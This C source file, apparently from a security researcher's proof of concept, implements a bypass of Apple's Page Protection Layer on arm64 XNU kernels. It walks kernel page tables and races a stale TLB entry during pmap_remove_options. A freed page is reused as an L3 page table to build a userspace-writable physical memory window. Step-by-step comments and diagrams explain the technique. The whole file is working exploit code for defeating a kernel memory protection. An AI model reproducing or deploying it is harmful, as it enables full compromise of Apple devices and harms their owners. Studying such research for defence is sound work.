//
//  ppl_bypass.c
//  Brandon Azad
//
#define PPL_BYPASS_INTERNAL 1
#include "ppl_bypass.h"

#include "kernel.h"
#include "kernel_call.h"
#include "kernel_memory.h"
#include "log.h"
#include "parameters.h"

#include "mach_vm.h"

#include <assert.h>
#include <pthread.h>
#include <unistd.h>

// ---- CPU binding -------------------------------------------------------------------------------

// Get the cpu_data object for the specified CPU.
static uint64_t
cpu_data(int cpu) {
	return kernel_read64(ADDRESS(CpuDataEntries) + SIZE(cpu_data_entry) * cpu
			+ OFFSET(cpu_data_entry, cpu_data_vaddr));
}

// Read the thread->CpuDatap field.
static uint64_t
thread_cpu_data(uint64_t thread) {
	return kernel_read64(thread + OFFSET(thread, CpuDatap));
}

// Read the cpu_data->cpu_processor field.
static uint64_t
cpu_data_processor(uint64_t cpu_data) {
	return kernel_read64(cpu_data + OFFSET(cpu_data, cpu_processor));
}

// Bind the current thread to the specified processor.
static void
bind_current_thread_to_processor(uint64_t thread, uint64_t processor) {
	// Bind the current thread to the specified processor.
	kernel_write64(thread + OFFSET(thread, bound_processor), processor);
	// Wait for the bind to take effect.
	for (;;) {
		usleep(20 * 1000);
		sched_yield();
		uint64_t cpu_data = thread_cpu_data(thread);
		uint64_t current_processor = cpu_data_processor(cpu_data);
		if (current_processor == processor) {
			return;
		}
	}
}

// ---- Page tables -------------------------------------------------------------------------------

// The root of the page table hierarchy for the kernel's half of the address space (TTBR1_EL1).
static uint64_t cpu_ttep;

// The XNU variables gPhysBase and gVirtBase.
static uint64_t gPhysBase;
static uint64_t gVirtBase;

// The ptov_table_entry type from XNU.
struct ptov_table_entry {
	uint64_t pa;
	uint64_t va;
	uint64_t len;
};

// A copy of XNU's ptov_table, for converting physical addresses to virtual addresses in the
// physmap.
struct ptov_table_entry ptov_table[8];

// Initialize state for page table walks.
static void
arm64_page_table_init() {
	cpu_ttep = kernel_read64(ADDRESS(cpu_ttep));
	gPhysBase = kernel_read64(ADDRESS(gPhysBase));
	gVirtBase = kernel_read64(ADDRESS(gVirtBase));
	kernel_read(ADDRESS(ptov_table), ptov_table, sizeof(ptov_table));
}

// Convert a physical address to a virtual address in the physmap.
static uint64_t
phystokv(uint64_t pa) {
	for (int i = 0; i < sizeof(ptov_table) / sizeof(ptov_table[0]); i++) {
		struct ptov_table_entry *ptov = &ptov_table[i];
		if (ptov->pa <= pa && pa < ptov->pa + ptov->len) {
			return pa - ptov->pa + ptov->va;
		}
	}
	return pa - gPhysBase + gVirtBase;
}

// Read from a physical address via the physmap.
static uint64_t
physical_read_64_physmap(uint64_t phys_addr) {
	assert(phys_addr != 0);
	assert((phys_addr >> 14) == ((phys_addr + sizeof(uint64_t) - 1) >> 14));
	return kernel_read64(phystokv(phys_addr));
}

// The number of virtual address bits for each page table level.
static const unsigned l1_size = 3;
static const unsigned l2_size = 11;
static const unsigned l3_size = 11;
static const unsigned pg_bits = 14;
static const unsigned phys_bits = 40;
static const uint64_t tt1_base = -(1uL << (l1_size + l2_size + l3_size + pg_bits));
static const uint64_t tt0_base = (1uL << (l1_size + l2_size + l3_size + pg_bits));

// Perform a page table lookup using the specified translation table.
static uint64_t
arm64_page_table_lookup(uint64_t ttb,
		uint64_t vaddr,
		uint64_t *p_l1_tte0, uint64_t *l1_tte0,
		uint64_t *p_l2_tte0, uint64_t *l2_tte0,
		uint64_t *p_l3_tte0, uint64_t *l3_tte0,
		uint64_t *vaddr_next) {
	const uint64_t tte_physaddr_mask = ((1uLL << phys_bits) - 1) & ~((1 << pg_bits) - 1);
	uint64_t l1_tt = ttb;
	uint64_t l1_index = (vaddr >> (l2_size + l3_size + pg_bits)) & ((1 << l1_size) - 1);
	uint64_t l2_index = (vaddr >> (l3_size + pg_bits)) & ((1 << l2_size) - 1);
	uint64_t l3_index = (vaddr >> pg_bits) & ((1 << l3_size) - 1);
	uint64_t pg_offset = vaddr & ((1 << pg_bits) - 1);
	uint64_t p_l1_tte = l1_tt + 8 * l1_index;
	if (p_l1_tte0 != NULL) {
		*p_l1_tte0 = p_l1_tte;
	}
	uint64_t l1_tte = physical_read_64_physmap(p_l1_tte);
	if (l1_tte0 != NULL) {
		*l1_tte0 = l1_tte;
	}
	if ((l1_tte & 3) != 3) {
		if (vaddr_next != NULL) {
			uint64_t l1_span = 1uL << (l2_size + l3_size + pg_bits);
			*vaddr_next = (vaddr & ~(l1_span - 1)) + l1_span;
		}
		return -1;
	}
	uint64_t l2_tt = l1_tte & tte_physaddr_mask;
	uint64_t p_l2_tte = l2_tt + 8 * l2_index;
	if (p_l2_tte0 != NULL) {
		*p_l2_tte0 = p_l2_tte;
	}
	uint64_t l2_tte = physical_read_64_physmap(p_l2_tte);
	if (l2_tte0 != NULL) {
		*l2_tte0 = l2_tte;
	}
	if ((l2_tte & 3) != 3) {
		if (vaddr_next != NULL) {
			uint64_t l2_span = 1uL << (l3_size + pg_bits);
			*vaddr_next = (vaddr & ~(l2_span - 1)) + l2_span;
		}
		return -1;
	}
	uint64_t l3_tt = l2_tte & tte_physaddr_mask;
	uint64_t p_l3_tte = l3_tt + 8 * l3_index;
	if (p_l3_tte0 != NULL) {
		*p_l3_tte0 = p_l3_tte;
	}
	uint64_t l3_tte = physical_read_64_physmap(p_l3_tte);
	if (l3_tte0 != NULL) {
		*l3_tte0 = l3_tte;
	}
	if (vaddr_next != NULL) {
		uint64_t l3_span = 1uL << pg_bits;
		*vaddr_next = (vaddr & ~(l3_span - 1)) + l3_span;
	}
	if ((l3_tte & 3) != 3) {
		return -1;
	}
	uint64_t pa = l3_tte & tte_physaddr_mask;
	return pa | pg_offset;
}

// Perform a kernel page table lookup (TTBR1_EL1).
static uint64_t
kernel_page_table_lookup(uint64_t vaddr,
		uint64_t *p_l1_tte, uint64_t *l1_tte,
		uint64_t *p_l2_tte, uint64_t *l2_tte,
		uint64_t *p_l3_tte, uint64_t *l3_tte,
		uint64_t *vaddr_next) {
	if (vaddr < tt1_base) {
		if (vaddr_next != NULL) {
			*vaddr_next = tt1_base;
		}
		return -1;
	}
	return arm64_page_table_lookup(cpu_ttep, vaddr, p_l1_tte, l1_tte,
			p_l2_tte, l2_tte, p_l3_tte, l3_tte, vaddr_next);
}

// Perform a user page table lookup (TTBR0_EL1).
static uint64_t
pmap_page_table_lookup(uint64_t pmap, uint64_t vaddr,
		uint64_t *p_l1_tte, uint64_t *l1_tte,
		uint64_t *p_l2_tte, uint64_t *l2_tte,
		uint64_t *p_l3_tte, uint64_t *l3_tte,
		uint64_t *vaddr_next) {
	uint64_t ttep = kernel_read64(pmap + OFFSET(pmap, ttep));
	if (ttep == cpu_ttep) {
		return kernel_page_table_lookup(vaddr, p_l1_tte, l1_tte,
			p_l2_tte, l2_tte, p_l3_tte, l3_tte, vaddr_next);
	}
	if (vaddr >= tt0_base) {
		if (vaddr_next != NULL) {
			*vaddr_next = tt1_base;
		}
		return -1;
	}
	return arm64_page_table_lookup(ttep, vaddr, p_l1_tte, l1_tte,
			p_l2_tte, l2_tte, p_l3_tte, l3_tte, vaddr_next);
}

// ---- Physical window ---------------------------------------------------------------------------

// The physical window.
static uint64_t physical_window;

// Since we will be manipulating page tables directly from userspace without going through the
// proper mechanisms, we need a way to flush TLB entries from userspace. In my testing, sleeping
// for at least 50 microseconds seems to work surprisingly reliably. A backup mechanism would be to
// allocate many pages of memory and touch each of them to flood the TLB cache and force other
// entries to be evicted.
static void
physical_window_tlb_flush() {
	usleep(70);
	usleep(70);
}

// Synchronize changes to the page tables.
static void
physical_window_page_table_sync() {
	__builtin_arm_dsb(15);
	physical_window_tlb_flush();
}

// Set the L3 TTE for the physical window and synchronize the page tables.
static void
physical_window_set_l3_tte(uint64_t l3_tte) {
	__builtin_arm_dsb(15);
	unsigned pw0_l3_tte_idx = (physical_window >> 14) & 0x7ff;
	volatile uint64_t *pw_l3_tt = (void *)(physical_window + 0x4000);
	pw_l3_tt[pw0_l3_tte_idx] = l3_tte;
	physical_window_page_table_sync();
}

void *
physical_window_map(uint64_t phys_addr, uint64_t l3_tte) {
	assert (0 <= phys_addr && phys_addr <= 0x0000ffffffffc000 && (phys_addr & 0x3fff) == 0);
	l3_tte = (l3_tte & ~0x0000ffffffffc000) | (phys_addr & 0x0000ffffffffc000);
	physical_window_set_l3_tte(l3_tte);
	return (void *) physical_window;
}

// ---- PPL bypass --------------------------------------------------------------------------------

// State for tlb_access_thread().
struct tlb_access_thread_args {
	_Atomic bool ready;
	_Atomic bool go;
	_Atomic bool stop;
	uint64_t page_Q_va;
};

// Pin the current thread to CPU 5 and then spin reading from page Q to keep the stale TLB entry
// alive.
static void
tlb_access_thread(struct tlb_access_thread_args *args) {
	// Run on CPU 5.
	bind_current_thread_to_processor(kernel_current_thread(), cpu_data_processor(cpu_data(5)));
	// Signal that we are ready.
	args->ready = true;
	// Wait for the signal to start spamming the TLB entry.
	while (!args->go) {}
	// Read from page Q in a tight loop to try and keep the TLB entry in the cache.
	uint64_t page_Q_va = args->page_Q_va;
	do {
		*(volatile uint64_t *)page_Q_va;
	} while (!args->stop);
	// Unbind the current thread.
	kernel_write64(kernel_current_thread() + OFFSET(thread, bound_processor), 0);
}

// A pthread function for tlb_access_thread().
static void *
tlb_access_thread_func(void *arg) {
	tlb_access_thread(arg);
	return NULL;
}

bool
kernel_ppl_bypass() {
	// Initialize the PPL bypass parameters.
	bool ok = ppl_bypass_parameters_init();
	if (!ok) {
		return false;
	}

	// Initialize page table lookups.
	arm64_page_table_init();

	// Check whether a physical window has already been established.
	uint64_t existing_physical_window_ptr = kernel_all_image_info_addr
		+ offsetof(struct kernel_all_image_info_addr, kernel_ppl_bypass_physical_window);
	uint64_t existing_physical_window = kernel_read64(existing_physical_window_ptr);
	if (existing_physical_window != 0) {
		physical_window = existing_physical_window;
		return true;
	}

	INFO("PPL bypass");

	// A convenience function to allocate pages at a fixed address.
	void (^vm_allocate_fixed)(uint64_t, size_t) = ^(uint64_t va, size_t size) {
		mach_vm_address_t address = va;
		kern_return_t kr = mach_vm_allocate(mach_task_self(),
				&address, size, VM_FLAGS_FIXED);
		assert(kr == KERN_SUCCESS && address == va);
	};
	void (^vm_deallocate)(uint64_t, size_t) = ^(uint64_t va, size_t size) {
		kern_return_t kr = mach_vm_deallocate(mach_task_self(), va, size);
		assert(kr == KERN_SUCCESS);
	};

	// Return the physical address corresponding to a vm_page struct.
	uint64_t vm_page_array_beginning_addr = kernel_read64(ADDRESS(vm_page_array_beginning_addr));
	uint64_t vm_page_array_ending_addr = kernel_read64(ADDRESS(vm_page_array_ending_addr));
	uint32_t vm_first_phys_ppnum = kernel_read32(ADDRESS(vm_first_phys_ppnum));
	uint64_t (^vm_page_pa)(uint64_t) = ^uint64_t(uint64_t m) {
		uint64_t ppnum;
		if (m >= vm_page_array_beginning_addr && m < vm_page_array_ending_addr) {
			uint64_t pai = (m - vm_page_array_beginning_addr) / SIZE(vm_page);
			ppnum = pai + vm_first_phys_ppnum;
		} else {
			ppnum = kernel_read32(m + OFFSET(vm_page, vmp_phys_page));
		}
		return (ppnum * 0x4000);
	};

	// Run on CPU 4.
	bind_current_thread_to_processor(kernel_current_thread(), cpu_data_processor(cpu_data(4)));

	// We will need to allocate pages at specific virtual addresses and at specific times.
	// Pages P and Q will be virtually discontiguous, but their L3 TTEs will be physically (and
	// hence virtually) contiguous on pages A and B, respectively; this is a precondition for
	// the exploit, which will give us a stale TLB entry for page Q even as the page is free
	// and available for reuse by PPL. Page R is faulted in to reallocate page Q as an L3 TT.
	// We will also allocate pages X and Y adjacent to P and Q; X and Y aren't actually used in
	// the exploit, they're only needed to keep the L3 TTs for P and Q (pages A and B,
	// respectively) alive.
	//
	//             +---+---+---+---+---+---+---+---+
	//             | O |   |   |   |   |   |   |   |   L1 TT
	//             +-|-+---+---+---+---+---+---+---+
	//               +----+
	//                    V
	//                    +---+---+---+---+---+---+---+---+
	//                    |   |   |(P)|   |(Q)|   |(R)|   |   L2 TT
	//                    +---+---+---+---+---+---+---+---+
	//
	//
	//     +---+---+---+---+---+---+---+---++---+---+---+---+---+---+---+---+
	//     |   |   |   |   |   |   |   |   ||   |   |   |   |   |   |   |   |   Pages
	//     +---+---+---+---+---+---+---+---++---+---+---+---+---+---+---+---+
	//     Page A                                                      Page B
	//
	// +-------------------------------+           +-------------------------------+
	// |                               |           |                               |   Pages
	// +-------------------------------+           +-------------------------------+
	// Page P                                      Page Q
	uint64_t page_P_va = 0x311ffc000;
	uint64_t page_Q_va = 0x314000000;
	uint64_t page_R_va = 0x318000000;
	uint64_t page_X_va = page_P_va - 0x4000;
	uint64_t page_Y_va = page_Q_va + 0x4000;
	vm_allocate_fixed(page_P_va, 0x4000);
	vm_allocate_fixed(page_Q_va, 0x4000);
	vm_allocate_fixed(page_R_va, 0x4000);
	vm_allocate_fixed(page_X_va, 0x4000);
	vm_allocate_fixed(page_Y_va, 0x4000);

	// Start a thread that will keep the TLB entry for page Q alive.
	struct tlb_access_thread_args tlb_access_thread_args = {};
	tlb_access_thread_args.page_Q_va = page_Q_va;
	pthread_t tlb_access_pthread;
	pthread_create(&tlb_access_pthread, NULL, tlb_access_thread_func, &tlb_access_thread_args);

	// Allocate 2 pages of contiguous physical memory by calling cpm_allocate(); call them A
	// and B. cpm_allocate() simply returns a list of pages, they are not entered into any map.
	uint64_t kernel_buf = kernel_vm_allocate(0x4000);
	int ret = (int) kernel_call_8(ADDRESS(cpm_allocate),
			2 * 0x4000, kernel_buf, 0, 0, 1, 0);
	if (ret != 0) {
		ERROR("cpm_allocate() failed: %d", ret);
	}
	uint64_t vm_page_A = kernel_read64(kernel_buf);
	uint64_t vm_page_B = kernel_read64(vm_page_A + OFFSET(vm_page, vmp_q_snext));
	kernel_vm_deallocate(kernel_buf, 0x4000);
	uint64_t page_A_pa = vm_page_pa(vm_page_A);
	uint64_t page_B_pa = vm_page_pa(vm_page_B);
	// TODO: Check that pages A and B are contiguous in the physmap.
	INFO("Allocated contiguous pages 0x%llx, 0x%llx", page_A_pa, page_B_pa);

	// Wait for the TLB access thread to be ready.
	while (!tlb_access_thread_args.ready) {}

	// Call pmap_mark_page_as_ppl_page() to insert pages A and B at the head of the
	// ppl_page_list. We do this in reverse order so that page A is at the head and will be
	// used as an L3 TT when page P is faulted in.
	kernel_call_8(ADDRESS(pmap_mark_page_as_ppl_page), page_B_pa);
	kernel_call_8(ADDRESS(pmap_mark_page_as_ppl_page), page_A_pa);

	// Quickly fault in pages P and Q to allocate pages A and B as L3 TTs for pages P and Q.
	// The virtual addresses for pages P and Q have been chosen such that the only populated L3
	// TTEs in pages A and B are the last entry on page A and the first entry on page B. This
	// means that the L3 TTEs for P and Q are virtually contiguous in the physmap while the
	// virtual addresses of P and Q are not.
	//
	//             +---+---+---+---+---+---+---+---+
	//             | O |   |   |   |   |   |   |   |   L1 TT
	//             +-|-+---+---+---+---+---+---+---+
	//               +----+
	//                    V
	//                    +---+---+---+---+---+---+---+---+
	//                    |   |   | A |   | B |   |(R)|   |   L2 TT
	//                    +---+---+-|-+---+-|-+---+---+---+
	//     +------------------------+       |
	//     V                                V
	//     +---+---+---+---+---+---+---+---++---+---+---+---+---+---+---+---+
	//     |   |   |   |   |   |   |(X)| P || Q |(Y)|   |   |   |   |   |   |   L3 TTs
	//     +---+---+---+---+---+---+---+-|-++-|-+---+---+---+---+---+---+---+
	//     Page A                        |    +----+                   Page B
	// V---------------------------------+         V
	// +-------------------------------+           +-------------------------------+
	// |                               |           |                               |   Pages
	// +-------------------------------+           +-------------------------------+
	// Page P                                      Page Q
	*(uint64_t *)page_P_va = 0x11223344;
	*(uint64_t *)page_Q_va = 0x55667788;
	INFO("Reallocated pages 0x%llx, 0x%llx as L3 page tables", page_A_pa, page_B_pa);
	// TODO: Check and retry if pages A and B weren't used as L3 TTs for P and Q.

	// In order to ensure that pages A and B are not freed when P and Q are removed, fault in
	// adjacent pages X and Y.
	*(uint64_t *)page_X_va = 0xaaaabbbb;
	*(uint64_t *)page_Y_va = 0xccccdddd;

	// Get the physical address of Q and the value of the L3 TTE that maps Q as read/write.
	uint64_t vm_map = kernel_read64(current_task + OFFSET(task, map));
	uint64_t pmap = kernel_read64(vm_map + OFFSET(vm_map, pmap));
	uint64_t page_Q_l3_tte = 0;
	uint64_t page_Q_pa = pmap_page_table_lookup(pmap, page_Q_va,
			NULL, NULL, NULL, NULL, NULL, &page_Q_l3_tte, NULL);
	INFO("Page 0x%llx is mapped by L3 TTE 0x%016llx", page_Q_pa, page_Q_l3_tte);

	// Signal the TLB access thread to spin in a loop reading from page Q to keep the TLB entry
	// alive. Originally the TLB access thread was going to perform the write and monitor for
	// the case when the TLB entry expires before we get a chance to use it, but this is
	// reliable enough for the POC.
	tlb_access_thread_args.go = true;

	// Call pmap_remove_options() to remove 2 pages starting from the virtual address of page P
	// (virtually, this does not include page Q). The vulnerability means that L3 TTEs for both
	// pages P and Q are removed, even though only the TLB entry for P is invalidated.
	//
	//             +---+---+---+---+---+---+---+---+
	//             | O |   |   |   |   |   |   |   |   L1 TT
	//             +-|-+---+---+---+---+---+---+---+
	//               +----+
	//                    V
	//                    +---+---+---+---+---+---+---+---+
	//                    |   |   | A |   | B |   |(R)|   |   L2 TT
	//                    +---+---+-|-+---+-|-+---+---+---+
	//     +------------------------+       |
	//     V                                V
	//     +---+---+---+---+---+---+---+---++---+---+---+---+---+---+---+---+
	//     |   |   |   |   |   |   | X |   ||   | Y |   |   |   |   |   |   |   L3 TTs
	//     +---+---+---+---+---+---+-|-+---++---+-|-+---+---+---+---+---+---+
	//     Page A                    o            o                    Page B
	//
	//                                             +-------------------------------+
	//                                             |                               |   Pages
	//                                             +-------------------------------+
	//                                             Page Q (accessible via TLB)
	ret = (int) kernel_call_8(ADDRESS(pmap_remove_options),
			pmap, page_P_va, page_P_va + 2 * 0x4000, 0x100);
	if (ret != 2) {
		ERROR("pmap_remove_options(): %d", ret);
	}

	// Quickly call pmap_mark_page_as_ppl_page() to insert page Q at the head of the
	// ppl_page_list.
	kernel_call_8(ADDRESS(pmap_mark_page_as_ppl_page), page_Q_pa);

	// Quickly fault in a backing page for R to allocate Q as an L3 TT for virtual address R.
	//
	//             +---+---+---+---+---+---+---+---+
	//             | O |   |   |   |   |   |   |   |   L1 TT
	//             +-|-+---+---+---+---+---+---+---+
	//               +----+
	//                    V
	//                    +---+---+---+---+---+---+---+---+
	//                    |   |   | A |   | B |   | Q |   |   L2 TT
	//                    +---+---+-|-+---+-|-+---+-|-+---+
	//                              o       |       |
	//  V-----------------------------------+       V
	//  +---+---+---+---+---+---+---+---+           +---+---+---+---+---+---+---+---+
	//  |   | Y |   |   |   |   |   |   |           | R |   |   |   |   |   |   |   |   L3 TTs
	//  +---+-|-+---+---+---+---+---+---+           +-|-+---+---+---+---+---+---+---+
	//        o  Page B       +-----------------------+      Page Q (accessible via TLB)
	//                        V
	//                        +-------------------------------+
	//                        |                               |   Pages
	//                        +-------------------------------+
	//                        Page R
	*(uint64_t *)page_R_va = 0xeeeeffff;

	// At this point, the stale TLB entry allows us to write to page Q, even though it has been
	// reallocated as an L3 TT in order to map page R. By writing to page Q the original L3 TTE
	// that mapped page Q itself, we establish a mapping at virtual address R of R's own L3 TT.
	//
	//             +---+---+---+---+---+---+---+---+
	//             | O |   |   |   |   |   |   |   |   L1 TT
	//             +-|-+---+---+---+---+---+---+---+
	//               +----+
	//                    V
	//                    +---+---+---+---+---+---+---+---+
	//                    |   |   | A |   | B |   | Q |   |   L2 TT
	//                    +---+---+-|-+---+-|-+---+-|-+---+
	//                              o       |       |
	//  V-----------------------------------+       V
	//  +---+---+---+---+---+---+---+---+           +---+---+---+---+---+---+---+---+
	//  |   | Y |   |   |   |   |   |   |       +-->| R | Q |   |   |   |   |   |   |   L3 TTs
	//  +---+-|-+---+---+---+---+---+---+       |   +-|-+-|-+---+---+---+---+---+---+
	//        o  Page B       +-----------------|-----+   |  Page Q (accessible via TLB)
	//                        V                 +---------+
	//                        +-------------------------------+
	//                        |                               |   Pages
	//                        +-------------------------------+
	//                        Page R
	*(volatile uint64_t *)(page_Q_va + 8) = page_Q_l3_tte;
	__builtin_arm_dsb(15);

	// Flush the stale TLB entry.
	physical_window_tlb_flush();
	INFO("Wrote to stale TLB cache entry for page 0x%llx", page_Q_pa);

	// Stop the TLB access thread, it's no longer needed.
	tlb_access_thread_args.stop = true;
	pthread_join(tlb_access_pthread, NULL);

	// Unbind the current thread.
	kernel_write64(kernel_current_thread() + OFFSET(thread, bound_processor), 0);

	// Alright, we have an address (page_R_va + 0x4000) that maps its own L3 TT as read/write
	// from EL0, which gives us an early physical window primitive! Next step is to rebuild
	// this primitive in the kernel's half of the address space, after which we can start
	// cleaning up state.
	uint64_t stage0_physical_window = page_R_va;
	volatile uint64_t *stage0_physical_window_l3_tte = (void *)(page_R_va + 0x4000);
	uint64_t stage0_physical_window_original_l3_tte = stage0_physical_window_l3_tte[0];
	uint64_t l3_tte_rw_el0 = page_Q_l3_tte & ~0x0000ffffffffc000;

	// Allocate the virtual pages for the kernel's physical window. This consists of two
	// virtual pages mapped by the same L3 TT.
	physical_window = kernel_vm_allocate(3 * 0x4000);
	if (((physical_window >> 14) & 0x7ff) <= 0x7fe) {
		kernel_vm_deallocate(physical_window + 2 * 0x4000, 0x4000);
	} else {
		kernel_vm_deallocate(physical_window, 0x4000);
		physical_window += 0x4000;
	}
	// Fault in the first page. This may be unnecessary as the pages seem to usually be faulted
	// in anyway.
	kernel_write64(physical_window, 0x1122334455667788);

	// Use our current physical window to map the L3 TT of the new physical window.
	uint64_t pw1_p_l3_tte = 0;
	kernel_page_table_lookup(physical_window + 0x4000,
			NULL, NULL, NULL, NULL, &pw1_p_l3_tte, NULL, NULL);
	uint64_t pw_l3_tt = pw1_p_l3_tte & ~0x3fff;
	uint64_t pw_l3_tt_tte = pw_l3_tt | l3_tte_rw_el0;
	stage0_physical_window_l3_tte[0] = pw_l3_tt_tte;
	physical_window_page_table_sync();

	// Make the second page of the new physical window map the L3 TT as well.
	*(volatile uint64_t *) (stage0_physical_window + (pw1_p_l3_tte & 0x3fff)) = pw_l3_tt_tte;
	physical_window_page_table_sync();

	// At this point our new physical window should be functional! Destroy the original
	// physical window by restoring the original L3 TTE for the first page and zeroing the L3
	// TTE for the second page.
	stage0_physical_window_l3_tte[0] = stage0_physical_window_original_l3_tte;
	physical_window_page_table_sync();
	stage0_physical_window_l3_tte[1] = 0;
	physical_window_page_table_sync();
	INFO("Constructed physical window at 0x%016llx", physical_window);

	// At this point, the only inconsistency left in the state is that pages A, B, and Q are
	// marked as PPL pages without having gone through the proper accounting. Thus, we will
	// need to extract them from PPL to ensure system stability. The most problematic page is
	// Q, since deallocating Q's virtual address right now will insert it into the vm_page
	// freelist, causing a panic when it's next mapped in.
	//
	// Fortunately, it's relatively straightforward to fix: deallocate all the TTEs in an L3 TT
	// will put the L3 TT page at the head of the ppl_page_list (as long as
	// pmap_pages_request_count is zero), from where we can extract the page from PPL using
	// pmap_mark_page_as_kernel_page(). As long as we win the race, this fully undoes the
	// damage from pmap_mark_page_as_ppl_page().
	//
	//             +---+---+---+---+---+---+---+---+
	//             | O |   |   |   |   |   |   |   |   L1 TT
	//             +-|-+---+---+---+---+---+---+---+
	//               +----+
	//                    V
	//                    +---+---+---+---+---+---+---+---+
	//                    |   |   | A |   | B |   | Q |   |   L2 TT
	//                    +---+---+-|-+---+-|-+---+-|-+---+
	//  +---------------------------+       |       +--------+
	//  V                        V----------+                V
	//  +---+---+---+---+---+---++---+---+---+---+---+---+   +---+---+---+---+---+---+
	//  |   |   |   |   | X |(P)||(Q)| Y |   |   |   |   |   | R |   |   |   |   |   |   L3 TTs
	//  +---+---+---+---+-|-+---++---+-|-+---+---+---+---+   +-|-+---+---+---+---+---+
	//  Page A            o            o  Page B               o  Page Q
	void (^extract_from_ppl)(uint64_t, uint64_t) = ^(uint64_t l3_tt_pa, uint64_t last_tte_va) {
		// TODO: Check pmap_pages_request_count.
		// Populate at least 10 pages in ppl_page_list.
		for (;;) {
			uint64_t ppl_page_count = kernel_read64(ADDRESS(ppl_page_count));
			if (ppl_page_count >= 10) {
				break;
			}
			DEBUG_TRACE(1, "Allocate PPL page");
			uint64_t page = kernel_call_8(ADDRESS(pmap_alloc_page_for_kern));
			kernel_call_8(ADDRESS(pmap_mark_page_as_ppl_page), page);
		}
		// Deallocate the last L3 TTE keeping the L3 TT alive.
		vm_deallocate(last_tte_va, 0x4000);
		// Try to grab the page out of PPL.
		uint64_t kernel_page = kernel_call_8(ADDRESS(pmap_mark_page_as_kernel_page));
		if (kernel_page != l3_tt_pa) {
			ERROR("Could not extract page 0x%llx from PPL", l3_tt_pa);
			if (kernel_page != 0) {
				kernel_call_8(ADDRESS(pmap_mark_page_as_ppl_page), kernel_page);
			}
		}
	};

	// Extract Q, A, and B. We need to extract page Q before deallocating page Q's virtual
	// address.
	extract_from_ppl(page_Q_pa, page_R_va);
	extract_from_ppl(page_A_pa, page_X_va);
	extract_from_ppl(page_B_pa, page_Y_va);

	// Now that PPL state is consistent, we can deallocate P and Q.
	vm_deallocate(page_P_va, 0x4000);
	vm_deallocate(page_Q_va, 0x4000);

	// Persist the physical window in kernel_all_image_info_addr.
	kernel_write64(existing_physical_window_ptr, physical_window);

	INFO("PPL bypass done");

	return true;
}
